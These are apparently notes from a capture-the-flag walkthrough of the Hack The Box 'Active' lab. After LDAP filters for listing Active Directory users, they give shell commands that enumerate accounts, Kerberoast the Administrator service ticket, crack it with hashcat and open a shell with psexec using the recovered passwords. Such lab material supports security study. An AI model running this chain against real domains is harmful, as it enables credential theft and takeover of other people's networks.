https://ldapwiki.com/wiki/Active%20Directory%20User%20Related%20Searches
```
ObjectClass vs ObjectCategory#
All users#
    (&(objectCategory=person)(objectClass=user))
or
    (sAMAccountType=805306368)
    
root@kali:~# ldapsearch -x -h 10.10.10.100 -p 389 -D ‘SVC_TGS’ -w ‘GPPstillStandingStrong2k18’-b “dc=active,dc=htb” -s sub”(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))” samaccountname | grep sAMAccountNamePage
sAMAccountName: Administrator
sAMAccountName: SVC_TGS

root@kali:~# GetADUsers.py -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
```

```
root@kali:~# GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request -output tgs-administrator.hash
root@kali:~# hashcat -a 0 -m 13100 tgs-administrator.hash /usr/share/wordlists/rockyou.txt –force
root@kali:~# hashcat -m 13100 tgs-administrator.hash –show
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*...[hash-value]...:Ticketmaster1968
root@kali:~# psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies
```
